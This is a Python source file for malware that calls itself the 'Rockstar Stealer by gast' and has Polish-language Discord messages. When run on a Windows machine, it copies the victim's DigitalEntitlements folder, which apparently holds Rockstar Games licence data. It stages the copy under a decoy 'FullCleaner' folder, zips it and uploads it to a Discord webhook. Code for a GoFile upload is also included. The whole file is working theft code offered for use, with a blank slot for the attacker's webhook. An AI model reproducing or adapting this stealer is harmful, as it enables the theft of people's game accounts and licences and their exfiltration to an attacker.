import os
import shutil
import asyncio
import discord
from discord import Webhook
import aiohttp
import requests
import gofile

async def send_webhook(url, download_link):
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(url, session=session)
        embed = discord.Embed(title="**Swieża rockstareczka wlasnie wpadla**", description=f"[**Klinij link aby przejsc do GoFile!**]({download_link})")
        await webhook.send(embed=embed, username="Rockstar Stealer by gast", content="@everyone")

def check_digital_entitlements_folder():
    local_appdata_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local')
    folder_path = os.path.join(local_appdata_path, 'DigitalEntitlements')

    return os.path.exists(folder_path)

def create_folder_if_not_exists(folder_path):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

def copy_digital_entitlements_folder():
    local_appdata_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local')
    source_folder_path = os.path.join(local_appdata_path, 'DigitalEntitlements')
    destination_folder_path = os.path.join(local_appdata_path, 'FullCleaner', 'DigitalEntitlements')

    if os.path.exists(source_folder_path):
        create_folder_if_not_exists(os.path.join(local_appdata_path, 'FullCleaner'))
        shutil.copytree(source_folder_path, destination_folder_path)
        zip_file_path = shutil.make_archive(destination_folder_path, 'zip', destination_folder_path)
        return zip_file_path
        return None

def upload_zip_to_gofile(zip_file_path):
    url = gofile.uploadFile(zip_file_path)
    return url

if __name__ == "__main__":
    webhook_url = "Your webhhok url"



    if check_digital_entitlements_folder():
        zip_file_path = copy_digital_entitlements_folder()
        if zip_file_path:
            files = {'file': open(zip_file_path, 'rb')}
            data = {
                'content': '@everyone'
            }
            response = requests.post(webhook_url,data=data, files=files)

